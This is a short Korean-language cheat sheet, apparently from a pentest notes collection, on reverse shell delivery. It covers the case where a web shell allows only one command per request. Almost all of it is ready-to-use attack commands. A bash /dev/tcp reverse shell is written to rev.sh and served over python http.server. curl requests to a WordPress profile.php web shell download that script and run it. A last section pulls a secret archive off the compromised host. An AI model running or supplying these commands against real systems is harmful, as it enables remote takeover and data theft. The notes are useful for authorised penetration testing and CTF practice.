# reverse shell delivery

웹셸 등 명령 실행 지점이 요청 1건당 명령 1개만 허용할 때. 페이로드를 파일로 내려놓고 실행해야 인터랙티브 셸을 받는다.

```text
[공격자] rev.sh 작성 → python3 -m http.server 80
[타깃]   웹셸 cmd= 로 wget → bash 실행   (요청 2건)
[공격자] nc 리스너에 셸 수신
```

## 공격자

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > rev.sh
python3 -m http.server 80
```

- 페이로드 내용은 타깃 상황에 맞게 → [README.md](./README.md) 상황 트리

## 타깃 (웹셸 cmd= 파라미터)

URL 공백은 인코딩이 필요하다. 브라우저면 `%20`, curl은 `-G --data-urlencode`로 맡긴다.

```bash
curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
  --data-urlencode "cmd=wget http://10.10.10.10/rev.sh -O /tmp/rev.sh"
curl -b cookie.txt -G "http://target/wp-admin/profile.php" \
  --data-urlencode "cmd=bash /tmp/rev.sh"
```

- PowerShell 페이로드는 따옴표 충돌이 심하다 → [windows_powershell_reverse_shell.md](./windows_powershell_reverse_shell.md)의 base64 -enc

## 반대 방향: 타깃 → 공격자 파일 회수

```bash
# 타깃 셸 안에서
cd /path/to/secret && python3 -m http.server 8080

# 공격자에서
wget http://target:8080/wordpress.old.zip
```
